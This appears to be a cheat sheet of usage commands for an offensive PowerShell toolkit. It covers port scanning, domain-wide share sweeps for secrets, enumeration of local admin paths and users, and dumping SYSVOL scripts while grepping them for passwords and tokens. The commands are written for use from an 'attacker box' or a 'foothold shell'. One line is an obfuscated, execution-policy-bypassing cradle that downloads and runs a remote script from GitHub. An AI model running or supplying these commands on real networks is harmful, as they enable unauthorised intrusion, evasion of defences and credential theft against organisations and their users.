local_audit Module
```
powershell -ExecutionPolicy Bypass -File .\local_audit.ps1                  # network + laptop
powershell -ExecutionPolicy Bypass -File .\local_audit.ps1 -Mode Network -PortCheck
powershell -ExecutionPolicy Bypass -File .\local_audit.ps1 -Mode Network -PassiveOnly
powershell -ExecutionPolicy Bypass -File .\local_audit.ps1 -Mode Host
```

Port Scan Module
```
.\portscan.ps1 -Target 192.168.1.1                                  # 95 common ports
.\portscan.ps1 -Target 192.168.1.0/24 -Ports 22,80,443,445,3389 -PingFirst
.\portscan.ps1 -Target 10.0.0.5 -Ports all -Banner -OutCsv gw.csv     # 1-65535 + banners
.\portscan.ps1 -Target 10.0.0.10-50,10.0.1.1 -Ports 1-1024
.\portscan.ps1 -TargetFile hosts.txt -Timeout 500 -Parallel 500
```
Snuffle
```
- .\Snuffle.ps1 → scan the current folder with the broad default ruleset
- .\Snuffle.ps1 -Path C:\Users\Public → scan a specific root
- .\Snuffle.ps1 -Interactive → tune extensions/keywords first, then scan

##  Quick start

```powershell
# Search the current folder with the broad default ruleset
.\Snuffle.ps1

# Search a specific root (local or UNC)
.\Snuffle.ps1 -Path C:\Users\Public
.\Snuffle.ps1 -Path \\fileserver\dept

# Discover every domain computer's shares and search them all
.\Snuffle.ps1 -Discover -OutputFile fleet_findings.csv

# Tune extensions/keywords interactively before searching
.\Snuffle.ps1 -Interactive
```

---
## Examples

```powershell
# Default: scan the current directory
.\Snuffle.ps1

# A whole user-profile tree, quiet, capped
.\Snuffle.ps1 -Path C:\Users\Public -MaxFindings 500 -Quiet

# Wider net: every text file + report extensions even without content hits
.\Snuffle.ps1 -Path C:\x -ScanAllTextFiles -ReportExtensionHits

# Search explicit shares and save both formats
.\Snuffle.ps1 -Share \\files\dept,\\files\finance -OutputFile out -Format both

# Domain sweep with admin shares included
.\Snuffle.ps1 -Discover -IncludeAdminShares -Throttle 40 -OutputFile all.csv

# Interactive tuning, then search
.\Snuffle.ps1 -Interactive
```

Check BitLocker

```
(New-Object -ComObject Shell.Application).NameSpace("C:\").Self.ExtendedProperty('System.Volume.BitLockerProtection')
```





How to run Get-LocalAdminPaths.ps1
```

powershell -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object ('Net'+'.'+'Web'+'Client'); $u=('https://raw.'+'githubu'+'sercontent.com/MselmiMedAziz/Tools/refs/heads/main/Get-LocalAdminPaths.ps1'); & ([scriptblock]::Create($w.('Download'+'String')($u))) -Mode Local"

# On a Windows PE / live Windows that can see the target's disk (physical path):
.\Get-LocalAdminPaths.ps1 -Mode Physical

# On the target itself with any foothold shell (local priv-esc path):
.\Get-LocalAdminPaths.ps1 -Mode Local

# From your attacker box, against the domain (highest ROI, no physical needed):
.\Get-LocalAdminPaths.ps1 -Mode AD -Domain corp.local -Target FS01
.\Get-LocalAdminPaths.ps1 -Mode AD -Domain corp.local -Credential (Get-Credential)   # explicit creds

# Everything at once:
.\Get-LocalAdminPaths.ps1 -Mode All -Domain corp.local
```


Get-UsersAndGroups.ps1
```
.\Get-UsersAndGroups.ps1 | Format-Table -AutoSize
.\Get-UsersAndGroups.ps1 -CsvPath .\users.csv
.\Get-UsersAndGroups.ps1 -SearchRoot "LDAP://OU=Staff,DC=contoso,DC=com"
```


SYSVOL

$f = Get-Content .\*_sysvol_findings.json -Raw | ConvertFrom-Json

# full paths
$f | ForEach-Object { $_.File }

# dump every script's contents
$f | Where-Object Type -eq 'Script' | ForEach-Object {
    "`n===== $($_.File) ====="
    Get-Content $_.File -ErrorAction SilentlyContinue
}

# grep for credentials
$f | ForEach-Object {
    Select-String -Path $_.File -Pattern 'password','passwd','pwd','net use','/user:','secret','token','key=' -ErrorAction SilentlyContinue
}
